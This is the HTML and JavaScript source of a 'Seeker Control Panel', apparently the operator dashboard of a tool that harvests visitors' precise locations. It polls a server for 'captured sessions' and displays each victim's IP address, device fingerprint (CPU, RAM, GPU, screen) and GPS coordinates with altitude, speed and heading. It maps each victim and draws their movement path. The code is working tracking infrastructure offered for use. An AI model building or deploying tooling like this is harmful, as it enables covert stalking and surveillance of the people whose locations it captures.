<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Seeker Control Panel</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  :root {
    --bg: #0d1117; --surface: #161b22; --border: #30363d;
    --text: #e6edf3; --text2: #8b949e; --accent: #58a6ff;
    --green: #3fb950; --red: #f85149; --yellow: #d29922; --purple: #bc8cff;
  }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); height: 100vh; overflow: hidden; }

  .header {
    background: var(--surface); border-bottom: 1px solid var(--border);
    padding: 12px 24px; display: flex; align-items: center; justify-content: space-between;
  }
  .header h1 { font-size: 18px; font-weight: 600; }
  .header h1 span { color: var(--accent); }
  .header .status { display: flex; gap: 16px; align-items: center; font-size: 13px; color: var(--text2); }
  .header .status .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green); display: inline-block; animation: pulse 2s infinite; }
  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

  .main { display: grid; grid-template-columns: 320px 1fr 360px; height: calc(100vh - 48px); }

  /* Left sidebar - session list */
  .sidebar { background: var(--surface); border-right: 1px solid var(--border); overflow-y: auto; }
  .sidebar-header { padding: 16px; border-bottom: 1px solid var(--border); font-size: 13px; color: var(--text2); text-transform: uppercase; letter-spacing: 1px; }
  .session-item {
    padding: 12px 16px; border-bottom: 1px solid var(--border); cursor: pointer; transition: background 0.15s;
  }
  .session-item:hover { background: rgba(88,166,255,0.08); }
  .session-item.active { background: rgba(88,166,255,0.15); border-left: 3px solid var(--accent); }
  .session-item .ip { font-size: 14px; font-weight: 600; font-family: monospace; }
  .session-item .meta { font-size: 12px; color: var(--text2); margin-top: 4px; }
  .session-item .badge {
    display: inline-block; font-size: 10px; padding: 2px 6px; border-radius: 10px;
    background: rgba(63,185,80,0.2); color: var(--green); margin-top: 4px;
  }
  .session-item .badge.loc { background: rgba(188,140,255,0.2); color: var(--purple); }

  /* Center - map */
  .map-container { position: relative; }
  #map { width: 100%; height: 100%; }
  .map-overlay {
    position: absolute; top: 12px; left: 12px; z-index: 1000;
    background: rgba(22,27,34,0.9); border: 1px solid var(--border); border-radius: 8px;
    padding: 8px 14px; font-size: 12px; color: var(--text2);
  }

  /* Right panel - details */
  .detail-panel { background: var(--surface); border-left: 1px solid var(--border); overflow-y: auto; }
  .detail-section { padding: 16px; border-bottom: 1px solid var(--border); }
  .detail-section h3 { font-size: 12px; color: var(--text2); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
  .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
  .info-card {
    background: var(--bg); border: 1px solid var(--border); border-radius: 6px; padding: 10px;
  }
  .info-card .label { font-size: 11px; color: var(--text2); margin-bottom: 4px; }
  .info-card .value { font-size: 13px; font-weight: 500; font-family: monospace; word-break: break-all; }

  .loc-table { width: 100%; font-size: 13px; }
  .loc-table td { padding: 4px 0; }
  .loc-table .label { color: var(--text2); width: 80px; }
  .loc-table .value { font-family: monospace; }

  .log-section { flex: 1; }
  .log-list { font-size: 12px; font-family: monospace; max-height: 300px; overflow-y: auto; }
  .log-entry { padding: 4px 0; border-bottom: 1px solid rgba(48,54,61,0.5); }
  .log-entry .time { color: var(--text2); }
  .log-entry .msg-info { color: var(--accent); }
  .log-entry .msg-loc { color: var(--purple); }
  .log-entry .msg-err { color: var(--red); }

  .empty { text-align: center; padding: 40px; color: var(--text2); font-size: 14px; }

  /* Google Maps link */
  .gmaps-btn {
    display: inline-block; margin-top: 8px; padding: 6px 12px;
    background: var(--accent); color: var(--bg); border-radius: 4px;
    text-decoration: none; font-size: 12px; font-weight: 600;
  }
  .gmaps-btn:hover { opacity: 0.85; }
</style>
</head>
<body>

<div class="header">
  <h1><span>Seeker</span> Control Panel</h1>
  <div class="status">
    <span><span class="dot"></span> Monitoring</span>
    <span id="session-count">0 sessions</span>
    <span id="last-update">-</span>
  </div>
</div>

<div class="main">
  <!-- Left: Session list -->
  <div class="sidebar">
    <div class="sidebar-header">Captured Sessions</div>
    <div id="session-list"></div>
  </div>

  <!-- Center: Map -->
  <div class="map-container">
    <div id="map"></div>
    <div class="map-overlay" id="map-overlay">Click a session to view location</div>
  </div>

  <!-- Right: Detail panel -->
  <div class="detail-panel" id="detail-panel">
    <div class="empty" id="detail-empty">Select a session from the list to view details</div>
    <div id="detail-content" style="display:none">
      <div class="detail-section">
        <h3>Device Information</h3>
        <div class="info-grid" id="device-info"></div>
      </div>
      <div class="detail-section">
        <h3>IP Information</h3>
        <div class="info-grid" id="ip-info"></div>
      </div>
      <div class="detail-section">
        <h3>Location</h3>
        <div id="location-info"></div>
      </div>
      <div class="detail-section log-section">
        <h3>Event Log</h3>
        <div class="log-list" id="log-list"></div>
      </div>
    </div>
  </div>
</div>

<script>
// --- State ---
let sessions = [];
let selectedIndex = -1;
let markers = {};
let map, markerGroup;

// --- Init map ---
map = L.map('map', { zoomControl: false }).setView([30, 0], 2);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
  attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
  maxZoom: 19
}).addTo(map);
L.control.zoom({ position: 'bottomright' }).addTo(map);
markerGroup = L.featureGroup().addTo(map);

// --- Polling ---
async function fetchSessions() {
  try {
    const resp = await fetch('/api/sessions');
    if (!resp.ok) return;
    sessions = await resp.json();
    document.getElementById('session-count').textContent = sessions.length + ' session' + (sessions.length !== 1 ? 's' : '');
    document.getElementById('last-update').textContent = 'Updated ' + new Date().toLocaleTimeString();
    renderSessionList();
    updateMap();
    if (selectedIndex >= 0 && selectedIndex < sessions.length) {
      renderDetail(selectedIndex);
    }
  } catch (e) { console.error('Fetch error:', e); }
}

setInterval(fetchSessions, 3000);
fetchSessions();

// --- Render session list ---
function renderSessionList() {
  const container = document.getElementById('session-list');
  if (sessions.length === 0) {
    container.innerHTML = '<div class="empty">Waiting for connections...</div>';
    return;
  }
  container.innerHTML = sessions.map((s, i) => {
    const info = s.info || {};
    const locs = s.locations || [];
    const lastLoc = locs.length > 0 ? locs[locs.length - 1] : null;
    const browser = info.browser || 'Unknown';
    const os = info.os || 'Unknown';
    const locCount = locs.length;
    return `<div class="session-item${i === selectedIndex ? ' active' : ''}" onclick="selectSession(${i})">
      <div class="ip">${s.ip}</div>
      <div class="meta">${os} / ${browser}</div>
      ${locCount > 0 ? `<span class="badge loc">${locCount} location${locCount > 1 ? 's' : ''}</span>` : ''}
    </div>`;
  }).join('');
}

// --- Select session ---
function selectSession(index) {
  selectedIndex = index;
  renderSessionList();
  renderDetail(index);
  focusOnSession(index);
}

function focusOnSession(index) {
  const s = sessions[index];
  if (!s) return;
  const locs = s.locations || [];
  const validLocs = locs.filter(l => l.status === 'success' && l.lat && l.lon);
  if (validLocs.length > 0) {
    const last = validLocs[validLocs.length - 1];
    const lat = parseFloat(last.lat);
    const lon = parseFloat(last.lon);
    if (!isNaN(lat) && !isNaN(lon)) {
      map.setView([lat, lon], 15, { animate: true });
      if (markers[s.ip]) {
        markers[s.ip].openPopup();
      }
    }
  }
}

// --- Update map markers ---
function updateMap() {
  // Remove old markers
  markerGroup.clearLayers();
  markers = {};

  sessions.forEach((s, i) => {
    const locs = s.locations || [];
    const validLocs = locs.filter(l => l.status === 'success' && l.lat && l.lon);
    if (validLocs.length === 0) return;

    const last = validLocs[validLocs.length - 1];
    const lat = parseFloat(last.lat);
    const lon = parseFloat(last.lon);
    if (isNaN(lat) || isNaN(lon)) return;

    const icon = L.divIcon({
      className: '',
      html: `<div style="
        width:14px;height:14px;border-radius:50%;
        background:${i === selectedIndex ? '#58a6ff' : '#f85149'};
        border:2px solid #fff;box-shadow:0 0 8px rgba(0,0,0,0.5);
      "></div>`,
      iconSize: [14, 14],
      iconAnchor: [7, 7]
    });

    const marker = L.marker([lat, lon], { icon }).addTo(markerGroup);
    const info = s.info || {};
    const popupHtml = `<div style="font-size:13px">
      <b>${s.ip}</b><br>
      ${info.os || 'Unknown'} / ${info.browser || 'Unknown'}<br>
      Lat: ${lat.toFixed(6)}, Lon: ${lon.toFixed(6)}<br>
      Accuracy: ${last.acc || 'N/A'}
    </div>`;
    marker.bindPopup(popupHtml);
    markers[s.ip] = marker;

    // Draw path if multiple locations
    if (validLocs.length > 1) {
      const coords = validLocs.map(l => [parseFloat(l.lat), parseFloat(l.lon)]);
      L.polyline(coords, { color: '#58a6ff', weight: 2, opacity: 0.5, dashArray: '5,5' }).addTo(markerGroup);
    }
  });

  // Fit bounds if there are markers
  if (Object.keys(markers).length > 0 && selectedIndex < 0) {
    try { map.fitBounds(markerGroup.getBounds().pad(0.2)); } catch(e) {}
  }
}

// --- Render detail panel ---
function renderDetail(index) {
  const s = sessions[index];
  if (!s) return;

  document.getElementById('detail-empty').style.display = 'none';
  document.getElementById('detail-content').style.display = 'block';

  const info = s.info || {};
  const locs = s.locations || [];

  // Device info
  const deviceFields = [
    ['OS', info.os], ['Platform', info.platform], ['Browser', info.browser],
    ['CPU Cores', info.cores], ['RAM', info.ram], ['GPU Vendor', info.vendor],
    ['GPU', info.render], ['Resolution', info.wd && info.ht ? info.wd + 'x' + info.ht : null]
  ];
  document.getElementById('device-info').innerHTML = deviceFields.map(([label, val]) =>
    `<div class="info-card"><div class="label">${label}</div><div class="value">${val || '-'}</div></div>`
  ).join('');

  // IP info
  const ipFields = [
    ['Public IP', info.ip], ['OS', info.os], ['Browser', info.browser]
  ];
  document.getElementById('ip-info').innerHTML = ipFields.map(([label, val]) =>
    `<div class="info-card"><div class="label">${label}</div><div class="value">${val || '-'}</div></div>`
  ).join('');

  // Location info
  if (locs.length === 0) {
    document.getElementById('location-info').innerHTML = '<div style="color:var(--text2);font-size:13px">No location data yet</div>';
  } else {
    const last = locs[locs.length - 1];
    const lat = parseFloat(last.lat);
    const lon = parseFloat(last.lon);
    const gmapsUrl = (!isNaN(lat) && !isNaN(lon))
      ? `https://www.google.com/maps/place/${lat}+${lon}`
      : null;

    document.getElementById('location-info').innerHTML = `
      <table class="loc-table">
        <tr><td class="label">Latitude</td><td class="value">${last.lat || '-'}</td></tr>
        <tr><td class="label">Longitude</td><td class="value">${last.lon || '-'}</td></tr>
        <tr><td class="label">Accuracy</td><td class="value">${last.acc || '-'}</td></tr>
        <tr><td class="label">Altitude</td><td class="value">${last.alt || '-'}</td></tr>
        <tr><td class="label">Direction</td><td class="value">${last.dir || '-'}</td></tr>
        <tr><td class="label">Speed</td><td class="value">${last.spd || '-'}</td></tr>
      </table>
      ${locs.length > 1 ? `<div style="margin-top:8px;font-size:12px;color:var(--text2)">${locs.length} total location updates</div>` : ''}
      ${gmapsUrl ? `<a class="gmaps-btn" href="${gmapsUrl}" target="_blank">Open in Google Maps</a>` : ''}
    `;
  }

  // Event log
  const logEntries = [];
  logEntries.push({ time: new Date(s.first_seen * 1000), type: 'info', msg: 'Session created' });
  if (s.info) {
    logEntries.push({ time: new Date(s.last_seen * 1000), type: 'info', msg: `Device info captured: ${s.info.os || 'Unknown'} / ${s.info.browser || 'Unknown'}` });
  }
  locs.forEach((l, i) => {
    if (l.status === 'success') {
      logEntries.push({ time: new Date(), type: 'loc', msg: `Location #${i+1}: ${l.lat}, ${l.lon} (accuracy: ${l.acc})` });
    } else {
      logEntries.push({ time: new Date(), type: 'err', msg: `Location error: ${l.error || 'Unknown'}` });
    }
  });

  document.getElementById('log-list').innerHTML = logEntries.map(e => {
    const timeStr = e.time.toLocaleTimeString();
    return `<div class="log-entry"><span class="time">${timeStr}</span> <span class="msg-${e.type}">${e.msg}</span></div>`;
  }).join('');
}

// --- Auto-select first session on data arrival ---
let autoSelected = false;
const origRender = renderSessionList;
</script>
</body>
</html>
